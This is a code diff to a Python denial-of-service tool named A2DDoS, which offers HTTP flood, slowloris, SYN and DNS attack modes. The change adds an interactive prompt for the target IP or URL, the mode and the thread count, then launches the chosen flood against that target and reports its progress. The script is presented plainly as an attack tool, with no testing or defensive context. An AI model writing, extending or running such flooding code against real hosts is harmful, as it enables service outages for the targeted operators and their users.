@@ -82,21 +82,34 @@ def dns(url, t=20):
     for _ in range(t): threading.Thread(target=f, daemon=True).start()
     return stats
 
-p = argparse.ArgumentParser(description="A2DDoS — Made by Ayush Rajdev")
-p.add_argument("target", help="IP or URL")
-p.add_argument("mode", nargs="?", default="http", choices=["http","slowloris","syn","dns"])
-p.add_argument("--t", type=int, default=50, help="Threads")
-p.add_argument("--c", type=int, default=500, help="Max conns (slowloris)")
-a = p.parse_args()
+# --- Interactive (no args) or CLI ---
+if len(sys.argv) > 1:
+    p = argparse.ArgumentParser(description="A2DDoS — Made by Ayush Rajdev")
+    p.add_argument("target", help="IP or URL")
+    p.add_argument("mode", nargs="?", default="http", choices=["http","slowloris","syn","dns"])
+    p.add_argument("--t", type=int, default=50, help="Threads")
+    p.add_argument("--c", type=int, default=500, help="Max conns (slowloris)")
+    a = p.parse_args()
+    url = a.target if a.target.startswith("http") else "http://" + a.target
+    mode = a.mode
+    t = a.t if a.mode != "slowloris" else a.c
+else:
+    print("A2DDoS — Made by Ayush Rajdev")
+    print("=" * 35)
+    url = input("Target (IP or URL): ").strip()
+    if not url.startswith("http"): url = "http://" + url
+    print("Modes: http, slowloris, syn, dns")
+    mode = input("Mode (default: http): ").strip() or "http"
+    t = input("Threads (default: 50): ").strip()
+    t = int(t) if t.isdigit() else 50
+    print()
 
-url = a.target if a.target.startswith("http") else "http://" + a.target
 modes = {"http": http, "slowloris": slowloris, "syn": syn, "dns": dns}
-m = a.mode
-
+m = mode
 print(f"[{m}] -> {url}  (Ctrl+C to stop)")
 print("=" * 35)
 start = time.time()
-modes[m](url, a.t if m != "slowloris" else a.c)
+modes[m](url, t)
 try:
     while running:
         e = time.time() - start or 0.001
@@ -112,3 +125,4 @@ e = time.time() - start
 n = stats.get("connections", stats["sent"])
 l = "Conns" if m in ("slowloris","dns") else "Sent"
 print(f"\nDone. {l}: {n} in {e:.0f}s")
+input("\nPress Enter to exit...")
